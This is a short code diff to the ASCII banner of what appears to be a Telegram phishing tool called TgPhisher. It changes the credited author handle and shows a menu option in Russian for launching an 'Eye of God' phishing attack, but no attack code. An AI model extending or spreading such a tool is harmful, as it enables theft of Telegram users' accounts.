@@ -53,10 +53,10 @@ def display_banner():
          |__   __|  |  __ \| |   (_)   | |                    
             | | __ _| |__) | |__  _ ___| |__   ___ _ __   
             | |/ _` |  ___/| '_ \| / __| '_ \ / _ \ '__|   
-            | | (_| | |    | | | | \__ \ | | |  __/ |        
+            | | (_| | |    | | | | \__ \ | | |  __/ |        By Botodetective
             |_|\__, |_|    |_| |_|_|___/_| |_|\___|_|      
                 __/ |                                     
-               |___/   {yellow}Telegram:{reset} t.me/CyberStalker1337              
+               |___/   {yellow}Telegram:{reset} t.me/Botodetective              
                  {yellow}GitHub:{reset} github.com/TheCyberStalker/TgPhisher
 
                     {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога
